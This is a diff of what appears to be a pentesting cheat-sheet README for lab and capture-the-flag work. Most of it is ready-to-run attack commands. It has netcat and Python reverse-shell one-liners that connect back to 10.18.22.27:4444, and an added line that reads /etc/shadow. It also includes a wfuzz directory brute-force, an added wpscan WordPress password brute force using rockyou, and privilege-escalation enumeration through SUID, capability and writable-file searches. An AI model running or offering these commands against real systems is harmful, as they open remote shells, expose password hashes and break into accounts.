@@ -15,9 +15,10 @@ Here are some handy tricks to enhance your pentesting workflow:
 ```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-#### Read a raw file using `xxd`:
+#### Read file:
 ```
 xxd -r file.txt 
+base64 /etc/shadow | base64 -d
 ```
 `l\s`: Equivalent to `ls`
 #### Decompress a gzip file:
@@ -33,7 +34,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
 * python
 ```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 * python3
 ```python
@@ -63,9 +64,13 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
 ### Web
-Discover hidden directories using `wfuzz`:
+#### Discover hidden directories using `wfuzz`:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
+```
+#### Brute force wordpress
+```
+wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ```
 ---
 ###  Encoding techniques:
@@ -97,13 +102,17 @@ sudo -l
 hystory
 ifconfig
 ip route
+uname -a
 netstat # -at -l -t -tp -i
+find / -writable 2>/dev/null
 find / -mtime 10 #find files that were modified in the last 10 days
 find . -name flag1.txt
 find / -type d -name config #find the directory named config under “/”
 find / -type f -perm /4000 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 find / -type f -perm -04000 -ls 2>/dev/null #compare executables on this list with GTFOBins
+getcap -r / 2>/dev/null
+cat /etc/exports #file sharing
 ```
 ####  Automated Enumeration Tools
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
